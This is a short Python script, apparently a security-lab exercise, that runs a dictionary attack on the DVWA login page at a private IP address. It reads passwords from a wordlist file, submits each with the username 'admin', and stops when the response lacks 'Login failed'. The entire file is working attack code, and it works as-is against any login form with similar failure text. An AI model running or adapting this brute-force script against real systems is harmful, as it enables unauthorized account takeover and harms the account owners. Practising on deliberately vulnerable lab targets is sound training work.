#!usr/bin/env python

import requests

TARGER_URL = "http://192.168.209.130/dvwa/login.php"
data = {"username": "", "password": "", "Login": "Login"}



def login(username, password):
    data["username"] = username
    data["password"] = password
    response = requests.post(TARGER_URL, data=data)
    return response.text

with open("passwords.txt", "r") as passwords:
    for password in passwords:
        password = password.strip()
        response = login("admin", password)
        # print(response)
        if "Login failed" not in response:
            print("[+] Found password: ", password)
            exit()
print("[+] Password not found")